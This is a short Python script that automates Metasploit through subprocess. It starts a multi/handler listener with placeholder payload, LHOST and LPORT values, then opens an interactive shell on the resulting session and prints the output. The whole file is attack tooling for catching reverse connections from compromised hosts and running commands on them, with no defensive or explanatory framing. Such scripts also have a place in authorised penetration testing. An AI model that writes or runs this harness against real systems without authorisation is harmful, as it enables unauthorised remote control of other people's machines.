import subprocess

# Define your Metasploit commands
msf_commands = """
use exploit/multi/handler
set PAYLOAD <payload_type>
set LHOST <your_ip>
set LPORT <your_port>
exploit -j -z
"""

session_commands = """
sessions -i <session_id>
shell
# You can add more commands here
exit
"""

# Start Metasploit
msf_process = subprocess.Popen(['msfconsole'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

# Execute Metasploit commands
msf_process.stdin.write(msf_commands)
msf_process.stdin.flush()

# Wait for the payload to execute and the session to be established
# Replace <session_id> with the actual session ID
session_commands = session_commands.replace("<session_id>", "<actual_session_id>")

# Interact with the session
msf_process.stdin.write(session_commands)
msf_process.stdin.flush()

# Read and process session output (stdout)
while True:
    output = msf_process.stdout.readline()
    if output == '':
        break
    print(output.strip())

# Close the Metasploit process
msf_process.stdin.close()
msf_process.stdout.close()
msf_process.stderr.close()
msf_process.wait()
